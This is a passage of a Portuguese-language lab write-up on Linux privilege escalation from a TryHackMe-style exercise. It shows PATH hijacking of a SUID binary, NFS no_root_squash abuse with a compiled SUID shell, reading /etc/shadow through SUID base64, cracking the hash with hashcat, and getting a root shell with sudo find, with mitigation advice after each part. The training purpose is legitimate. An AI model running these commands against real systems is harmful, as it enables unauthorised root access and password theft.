-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
```

**Análise das permissões:**

- `rwsr-xr-x` = O 's' indica SUID ativo
- Dono: root → Quando executado, roda como root
- Grupo: root
- Nós (usuário comum) podemos executar

#### 3. Entendendo o que o Programa Faz

Vamos verificar o que o programa executa:

```bash
strings test | grep -E "system|exec|popen"
```

Ou analisando o script Python relacionado:

```bash
cat thm.py
```

```python
#!/usr/bin/python3
import os
import sys

try: 
    os.system("thm")  # PERIGO! Chama "thm" sem caminho absoluto
except:
    sys.exit()
```

**Identificamos a vulnerabilidade:** O programa tenta executar um comando chamado `thm`, mas **não especifica onde ele está** (sem caminho absoluto).

#### 4. Testando a Vulnerabilidade

```bash
./test
```

```text
sh: 1: thm: not found
```

**Interpretação:** O sistema procurou `thm` em todos os diretórios do PATH e não encontrou. Perfeito para nosso ataque!

#### 5. Criando o Executável Malicioso

```bash
# Vamos usar o diretório atual, que é gravável
echo "/bin/bash" > thm
chmod +x thm
ls -l thm
```

```text
-rwxrwxr-x 1 murdoch murdoch 10 Jun 17 14:36 thm
```

**O que fizemos:**

- Criamos um script chamado `thm` com o conteúdo `/bin/bash`
- Damos permissão de execução (`chmod +x`)
- O script simplesmente inicia um shell bash

#### 6. Manipulando o PATH

```bash
# Adiciona nosso diretório ao início do PATH
export PATH=/home/murdoch:$PATH

# Verifica se funcionou
echo $PATH
/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Agora:** Quando qualquer programa procurar por `thm`, o sistema vai olhar PRIMEIRO em `/home/murdoch`, onde está nosso script malicioso.

#### 7. Executando o Ataque

```bash
./test
```

```bash
# Verificamos se funcionou
whoami
root

id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

**SUCESSO!** Temos shell root!

#### 8. O que Aconteceu nos Bastidores:

1. Executamos `./test` (programa SUID root)
2. O programa chamou `system("thm")`
3. O sistema consultou o PATH: `/home/murdoch` (1º)
4. Encontrou nosso script `thm` em `/home/murdoch`
5. Executou nosso script **com privilégios de root**
6. Nosso script executou `/bin/bash` como root

#### 9. Encontrando a Flag

```bash
# Procura por arquivos com "flag" no nome (melhorado)
find / -type f -name "*flag*" 2>/dev/null | while read file; do
    echo "Arquivo encontrado: $file"
    ls -la "$file" 2>/dev/null
done
```

**Explicando o comando:**

- `-type f`: busca apenas arquivos (não diretórios)
- `-name "*flag*"`: qualquer arquivo com "flag" no nome
- `while read file`: processa cada resultado
- Exibe permissões e localização

**Resultado:**

```text
Arquivo encontrado: /home/matt/flag6.txt
-rw-r--r-- 1 root root 15 Jun 20  2021 /home/matt/flag6.txt
```

```bash
cat /home/matt/flag6.txt
THM-736628929
```

### Checklist Prático para Exploração

Quando encontrar um binário SUID, siga este checklist:

1. **Identifique o que o binário executa:**

```bash
strings /caminho/do/binario | grep -E "system|exec|popen"
```

2. **Liste os diretórios no PATH atual:**

```bash
echo $PATH | tr ':' '\n'
```

3. **Encontre diretórios graváveis:**

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

4. **Crie o executável malicioso:**

```bash
echo '#!/bin/bash' > /tmp/thm
echo '/bin/bash -p' >> /tmp/thm  # -p preserva privilégios
chmod +x /tmp/thm
```

5. **Modifique o PATH:**

```bash
export PATH=/tmp:$PATH
```

6. **Execute o binário vulnerável:**

```bash
/caminho/do/binario
```

### Variações do Ataque

#### Comandos com Argumentos

Se o programa chama algo como `system("thm -a -b")`, nosso script ainda funciona, mas podemos capturar argumentos:

```bash
echo '#!/bin/bash' > /tmp/thm
echo '/bin/bash -p' >> /tmp/thm
```

#### Usando Outras Linguagens

Podemos criar o executável malicioso em C para mais discrição:

```c
// thm.c
#include <unistd.h>
#include <stdlib.h>
void main() {
    setuid(0);
    setgid(0);
    system("thm");
}
```

```bash
gcc thm.c -o thm -w
```

### Prevenção (Para Administradores)

Para proteger sistemas contra PATH Hijacking:

1. **Use caminhos absolutos SEMPRE:**

```c
// ERRADO
system("ls");

// CORRETO
system("/bin/ls");
```

2. **Defina PATH seguro em scripts:**

```bash
# No início de scripts, defina um PATH restrito
PATH="/usr/local/bin:/usr/bin:/bin"
export PATH
```

3. **Evite SUID em scripts:** Scripts com SUID são inerentemente perigosos

4. **Audite binários SUID regularmente:**

```bash
find / -perm -4000 -ls 2>/dev/null
```

5. **Remova SUID desnecessário:**

```bash
sudo chmod u-s /caminho/do/binario
```

### Resumo da Exploração

PATH Hijacking é uma técnica poderosa que explora a confiança cega no PATH e o uso de caminhos relativos. Em sistemas bem configurados, é mais difícil de explorar diretamente, mas em CTFs e ambientes de teste, é uma das maneiras mais rápidas de escalar privilégios quando se encontra um binário SUID que executa comandos sem caminhos absolutos.

**Lembre-se:** Esta técnica funciona porque o sistema confia na ordem do PATH. Como atacante, você está apenas "ajudando" o sistema a encontrar um executável "mais conveniente" primeiro!

---
## 9. NFS (Network File System)

### 9.1. Visão Geral

O NFS (Network File System) é um protocolo que permite compartilhar diretórios entre sistemas em uma rede. Quando mal configurado, pode se tornar um vetor crítico para escalação de privilégios.

O arquivo de configuração do NFS fica em `/etc/exports` e define quais diretórios são compartilhados e com quais opções.

### 9.2. Identificando a Vulnerabilidade

A opção crítica para escalação de privilégios é **`no_root_squash`**.

|Opção|Comportamento Normal|Com `no_root_squash`|
|---|---|---|
|`root_squash` (padrão)|Root do cliente é mapeado para usuário `nfsnobody` (sem privilégios)|-|
|`no_root_squash`|-|**Root do cliente mantém privilégios root** no compartilhamento|

Se um compartilhamento estiver configurado com `no_root_squash` e for **gravável**, podemos:

1. Criar um binário com SUID em nossa máquina atacante
2. Executá-lo na máquina alvo para obter root 

### 9.3. Verificando a Configuração

```bash
# No alvo - verificar compartilhamentos com no_root_squash
cat /etc/exports
```

**Exemplo de saída vulnerável:**

```text
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

### 9.4. Enumerando Compartilhamentos

Da máquina atacante, listamos os compartilhamentos disponíveis:

```bash
showmount -e [IP_ALVO]
```

**Saída:**

```text
Export list for [IP_ALVO]:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

### 9.5. Montando o Compartilhamento

Criamos um diretório local e montamos o compartilhamento remoto:

```bash
# Criar diretório para montagem
mkdir /tmp/nfs_mount

# Montar o compartilhamento (requer sudo)
sudo mount -o rw [IP_ALVO]:/tmp /tmp/nfs_mount

# Verificar montagem
mount | grep nfs
df -h | grep nfs
```

**Explicação do comando:**

- `sudo`: Necessário porque montar sistemas de arquivos é operação privilegiada
- `mount`: Comando para montar sistemas de arquivos
- `-o rw`: Monta com permissões de leitura e escrita
- `[IP_AVLO]:/tmp`: Host remoto e diretório compartilhado
- `/tmp/nfs_mount`: Ponto de montagem local

> **Nota:** O `sudo` é necessário porque a montagem de sistemas de arquivos NFS requer privilégios de root na máquina atacante.

### 9.6. Criando o Binário Malicioso

Dentro do diretório montado (agora acessível tanto local quanto remotamente), criamos nosso exploit:

**Código (`nfs_exploit.c`):**

```c
#include <unistd.h>
#include <stdlib.h>

int main()
{
    // Define os IDs de usuário e grupo para root (0)
    setuid(0);
    setgid(0);
    
    // Executa uma shell
    system("/bin/bash");
    
    return 0;
}
```

**Compilação e configuração:**

```bash
# Compilar estaticamente para evitar problemas de dependências
gcc -static nfs_exploit.c -o nfs_shell

# Adicionar SUID bit (agora como root na máquina atacante)
sudo chmod +s nfs_shell

# Verificar permissões
ls -l nfs_shell
```

**Saída esperada:**

```text
-rwsr-sr-x 1 root root 835968 Mar 3 15:16 nfs_shell
```

Os bits `s` no lugar de `x` indicam SUID e SGID ativos.

### 9.7. Executando no Alvo

No terminal da máquina alvo (via shell já obtido), navegamos até o diretório compartilhado:

```bash
# No alvo
cd /tmp
ls -l
```

**Saída:**

```text
-rwsr-sr-x  1 root root 835968 Mar  3 15:16 nfs_shell
-rw-r--r--  1 root root    112 Mar  3 15:13 nfs_exploit.c
```

**Saída:**

```bash
./nfs_shell
whoami
```

**Resultado:**

```text
root
```

### 9.8. Desmontando o Compartilhamento (Boas Práticas)

Após obter acesso root, é boa prática desmontar o compartilhamento na máquina atacante:

```bash
# Sair do diretório montado
cd ~

# Desmontar
sudo umount /tmp/nfs_mount

# Verificar se desmontou
mount | grep nfs  # Não deve retornar nada
```

### 9.9. Coleta da Flag

```bash
# Buscar flags
find / -name "flag*" 2>/dev/null

# Resultado típico
/home/matt/flag7.txt

# Ler a flag
cat /home/matt/flag7.txt
```

**Flag:**

```text
THM-89384012
```

### 9.10. Resumo do Vetor

|Passo|Ação|Local|
|---|---|---|
|1|Identificar `no_root_squash` em `/etc/exports`|Alvo|
|2|Listar compartilhamentos com `showmount`|Atacante|
|3|Montar compartilhamento com `sudo mount`|Atacante|
|4|Criar binário SUID no diretório montado|Atacante|
|5|Executar binário no alvo|Alvo|
|6|Obter shell root|Alvo|
|7|Desmontar compartilhamento|Atacante|

### 9.11. Mitigação

Para prevenir este vetor:

1. **Evite `no_root_squash`** em compartilhamentos graváveis
2. Use `root_squash` (padrão) para mapear root para `nfsnobody` 
3. Restrinja acesso por IP sempre que possível
4. Use firewalls para limitar quem pode montar os compartilhamentos
5. Monitore atividades suspeitas em diretórios compartilhados

---
## 10. Na Prática: Escalação de Privilégios em Cenário Real

Este cenário prático demonstra uma cadeia completa de escalação de privilégios em Linux, desde a enumeração inicial com **LinPEAS** até a obtenção de acesso root.

### 10.1. Enumeração Automatizada com LinPEAS

**LinPEAS** (Linux Privilege Escalation Awesome Script) é um script que automatiza a busca por vetores de escalação de privilégios.

**Na máquina atacante (servindo o script):**

```bash
# Iniciar servidor HTTP para transferir o script
sudo python3 -m http.server 80
```

**Na máquina alvo (baixando e executando):**

```bash
# Baixar o script
wget "http://[IP_ATACANTE]/linpeas.sh"

# Dar permissão de execução
chmod +x linpeas.sh

# Executar
./linpeas.sh
```

### 10.2. Descoberta Crucial: SUID em /usr/bin/base64

Entre os resultados do LinPEAS, um item se destacou:

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x. 1 root root 37K Ago 20  2019 /usr/bin/base64  
```

#### O que significa SUID?

|Permissão|Significado|
|---|---|
|`rwsr-xr-x`|O 's' no lugar do 'x' para o dono indica **SUID ativo**|
|`root root`|O binário pertence ao root|
|`/usr/bin/base64`|Binário que pode ser executado com privilégios de root|

**SUID (Set User ID):** Quando um binário com SUID é executado, ele roda com as permissões do **dono do arquivo** (root), não do usuário que o executou.)

### 10.3. Explorando base64 com SUID

Consultando o **[GTFOBins](https://gtfobins.org/base64/)** (repositório de binários exploráveis), descobrimos que base64 pode ser usado para ler arquivos:

```bash
# Ler o arquivo de senhas (shadow)
base64 /etc/shadow | base64 --decode
```

**Explicação do comando:**

1. `base64 /etc/shadow`: Codifica o conteúdo do shadow em base64 (requer leitura do arquivo)
2. `|`: Pipe (redireciona saída)
3. `base64 --decode`: Decodifica de volta ao formato original

**Por que funciona?**

- O binário `base64` tem SUID root → pode ler qualquer arquivo
- A codificação em base64 é apenas para transporte seguro
- O resultado final é o conteúdo original do arquivo

**Resultado obtido:**

```text
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
```

### 10.4. Quebra do Hash com Hashcat

#### Identificando o tipo de hash:

```bash
hashid -m '$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
'
```

**Resultado:**

```text
[+] SHA-512 Crypt [Hashcat Mode: 1800]
```

#### Preparando para quebra:

```bash
# Salvar hash em arquivo
echo '$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/' > hash.txt

# Executar Hashcat
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Explicação do Hashcat:**

|Parâmetro|Descrição|
|---|---|
|`-m 1800`|Modo SHA-512 Crypt (Unix)|
|`-a 0`|Ataque de dicionário (straight)|
|`hash.txt`|Arquivo com o hash alvo|
|`/usr/share/wordlists/rockyou.txt`|Wordlist para o ataque|

**Resultado:**

```text
$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:Password1
```

**Senha encontrada:** `Password1`

### 10.5. Acesso como Usuário missy

```bash
# Trocar para usuário missy
su missy
# Senha: Password1

# Verificar usuário atual
whoami
```

**Resultado:**

```text
missy
```

### 10.6. Coleta da Primeira Flag

```bash
# Buscar arquivos com nome 'flag1.txt'
find / -name "flag1.txt" 2>/dev/null
```

**Resultado:**

```text
/home/missy/Documents/flag1.txt
```

```bash
# Ler a flag
cat /home/missy/Documents/flag1.txt
```

**Flag 1:**

```text
THM-42828719920544
```

### 10.7. Escalação para Root

#### Verificando permissões sudo do usuário missy:

```bash
sudo -l
```

**Resultado:**

```text
Usuário missy pode executar os seguintes comandos em [IP_AVLO]:
    (ALL) NOPASSWD: /usr/bin/find
```

#### O que esta linha significa?

|Componente|Significado|
|---|---|
|`(ALL)`|Pode executar como qualquer usuário (inclusive root)|
|`NOPASSWD:`|Não solicita senha|
|`/usr/bin/find`|Único binário permitido|

**Implicação:** Podemos executar `find` com privilégios de root sem fornecer senha.

### 10.8. Explorando find com GTFOBins

Consultando **[GTFOBins para find](https://gtfobins.org/find/)**:

```bash
sudo find . -exec /bin/sh \; -quit
```

**Explicação do comando:**

|Parte|Descrição|
|---|---|
|`sudo`|Executa como root|
|`find .`|Busca no diretório atual|
|`-exec /bin/sh \;`|Para cada arquivo encontrado, executa `/bin/sh`|
|`-quit`|Sai após a primeira execução (evita múltiplas shells)|

**Resultado:**

```bash
sh-4.2# whoami
root
```

### 10.9. Coleta da Flag Root

```bash
# Buscar segunda flag
find / -name "flag2.txt" 2>/dev/null
```

**Resultado:**

```text
/home/rootflag/flag2.txt
```

```bash
# Ler a flag
cat /home/rootflag/flag2.txt
```

**Flag 2:**

```text
THM-168824782390238
```

### 10.10. Resumo da Cadeia de Ataque

|Passo|Ação|Resultado|
|---|---|---|
|1|LinPEAS identificou `/usr/bin/base64` com SUID|Vetor de leitura de arquivos|
|2|Exploramos base64 para ler `/etc/shadow`|Obtivemos hash do usuário missy|
|3|Hashcat quebrou o hash|Senha `Password1` descoberta|
|4|Acesso como missy|Primeira flag coletada|
|5|`sudo -l` revelou permissão para `find`|Vetor de escalação identificado|
|6|GTFOBins forneceu comando para exploit|Shell root obtido|
|7|Busca e leitura da flag root|Segunda flag coletada|

### 10.11. Lições Aprendidas

| Vulnerabilidade                      | Correção                                                         |
| ------------------------------------ | ---------------------------------------------------------------- |
| SUID em binários desnecessários      | Remover SUID de binários como base64: `chmod -s /usr/bin/base64` |
| Senha fraca (Password1)              | Política de senhas fortes                                        |
| Sudo excessivo (`find` com NOPASSWD) | Restringir comandos sudo ao mínimo necessário                    |

---
## 11. Conclusão

### 11.1. Síntese dos Resultados

Ao longo deste laboratório, foram explorados com sucesso **sete vetores distintos** de escalação de privilégios em um sistema Linux Ubuntu 14.04. A tabela abaixo resume os principais resultados obtidos:

| Seção  | Vetor Explorado           | Método                      |
| ------ | ------------------------- | --------------------------- |
| **3**  | OverlayFS (CVE-2015-1328) | Exploit de kernel           |
| **4**  | Sudo mal configurado      | GTFOBins (find)             |
| **5**  | SUID em base64            | Leitura de arquivos + John  |
| **6**  | Capabilities (cap_setuid) | Exploração de capabilities  |
| **7**  | Cron Jobs                 | Reverse shell via backup.sh |
| **8**  | PATH Hijacking            | Manipulação de PATH         |
| **9**  | NFS (no_root_squash)      | Criação de binário SUID     |
| **10** | Cenário Prático           | SUID + Sudo combinados      |

### 11.2. Análise Crítica

#### 11.2.1. A Importância da Enumeração

A enumeração sistemática provou ser o fator mais crítico para o sucesso da escalação. Em todos os casos, a descoberta do vetor vulnerável dependeu de uma verificação cuidadosa do sistema:

- **SUID:** `find / -perm -4000 2>/dev/null`
- **Sudo:** `sudo -l`
- **Capabilities:** `getcap -r / 2>/dev/null`
- **Cron:** `cat /etc/crontab`
- **NFS:** `cat /etc/exports`

Sem estas verificações iniciais, os vetores permaneceriam ocultos.

#### 11.2.2. A Relevância do GTFOBins

O repositório **GTFOBins** demonstrou ser uma ferramenta indispensável para o pentester. Em múltiplas ocasiões (find, base64), a consulta a este recurso forneceu os comandos exatos necessários para explorar binários com permissões especiais.

#### 11.2.3. Vulnerabilidades de Kernel vs. Configuração

Das explorações realizadas:

- **2** envolveram vulnerabilidades de kernel (OverlayFS)
- **5** envolveram más configurações do sistema (sudo, SUID, capabilities, cron, NFS)

Este dado reforça a importância de **auditorias de configuração** regulares, não apenas da atualização do kernel.

---
## 12. Referências

### 12.1. Documentação Oficial e Bases de Vulnerabilidades

|Recurso|Descrição|Link|
|---|---|---|
|**CVE-2015-1328**|OverlayFS Vulnerability|[cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1328)|
|**CVE-2016-5195**|Dirty COW|[dirtycow.ninja](https://dirtycow.ninja/)|
|**CVE-2021-4034**|PwnKit|[qualys.com](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)|
|**Ubuntu Security Notices**|Boletins de segurança Ubuntu|[ubuntu.com/security](https://ubuntu.com/security)|

### 12.2. Ferramentas e Repositórios

|Ferramenta|Descrição|Link|
|---|---|---|
|**LinPEAS**|Script de enumeração|[github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)|
|**GTFOBins**|Binários Unix exploráveis|[gtfobins.github.io](https://gtfobins.github.io/)|
|**Exploit Database**|Base de exploits|[exploit-db.com](https://www.exploit-db.com)|
|**Hashcat**|Ferramenta de quebra de hashes|[hashcat.net](https://hashcat.net)|
|**John the Ripper**|Quebra de senhas|[openwall.com/john](https://www.openwall.com/john/)|

### 12.3. Artigos e Documentação Técnica

|Título|Autor/Fonte|Link|
|---|---|---|
|**Linux Privilege Escalation**|TryHackMe|[tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)|
|**Basic Linux Privilege Escalation**|g0tmi1k|[blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)|
|**Linux Privilege Escalation Cheatsheet**|HackTricks|[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)|
|**OverlayFS Vulnerability Analysis**|Seclists|[seclists.org/oss-sec](http://seclists.org/oss-sec/2015/q2/717)|

### 12.4. Wordlists e Recursos Adicionais

| Recurso         | Descrição                       | Localização Típica                 |
| --------------- | ------------------------------- | ---------------------------------- |
| **rockyou.txt** | Wordlist para quebra de senhas  | `/usr/share/wordlists/rockyou.txt` |
| **SecLists**    | Coleção abrangente de wordlists | `/usr/share/seclists`              |
